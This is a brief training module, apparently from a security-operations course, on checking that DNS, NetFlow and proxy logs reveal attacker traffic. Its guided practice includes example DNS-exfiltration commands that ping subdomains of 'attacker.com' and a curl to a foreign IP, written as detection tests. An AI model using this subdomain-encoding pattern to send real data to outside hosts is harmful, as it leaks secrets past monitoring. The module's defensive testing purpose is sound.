# Validating Network Visibility

## 1. Orientation

### What this module covers
This module covers validating **NetFlow**, **DNS Logs**, and **Proxy Logs**.

### Fit in the Learning Path
Files can be deleted. RAM can be flushed. But the Network Packet *must* travel. It is the hardest artifact to hide.

### Learning Objectives
By the end of this module, you should understand:
*   **North-South** vs **East-West** validation.
*   **DNS Tunnel detection**.
*   **Beaconing detection**.

---

## 2. Core Content

### The Three Planes
1.  **DNS**: The Phonebook. "Adversary asks for IP of `evil.com`".
    *   *Validation*: `nslookup playbook.test`. Does it appear in logs?
2.  **Flow**: The Connection. "Internal IP talked to Russia".
    *   *Validation*: `curl http://foreign-ip`.
3.  **Proxy**: The Content. "User downloaded `virus.exe`".
    *   *Validation*: Download EICAR test file.

---

## 3. Guided Practice

### DNS Exfiltration Test
**Action**:
Run a script that queries unique subdomains.
`ping secret1.attacker.com`
`ping secret2.attacker.com`

**Validation**:
*   Check DNS Server Logs (or SIEM).
*   Do you see `secret1` and `secret2`?
*   Do you have a rule for "High Volume of Queries to Single Domain"?

---

## 4. Reflection Check

1.  **DoH**: DNS over HTTPS. (It blinds traditional DNS logging. You need Endpoint logging to see the browser's queries before they are encrypted).
2.  **Lateral Movement**: Can you see PC-to-PC traffic? (Most firewalls don't see this. You need NetFlow from the Core Switch).
3.  **Time**: NTP sync is vital for correlating Network logs with Host logs.

---

## 5. Completion Criteria

This module is complete when:
1.  You ensure **DNS Logging** is enabled on Domain Controllers.
2.  You validate **East-West** visibility (or admit the gap).
3.  You can find a "Beacon" in the noise.
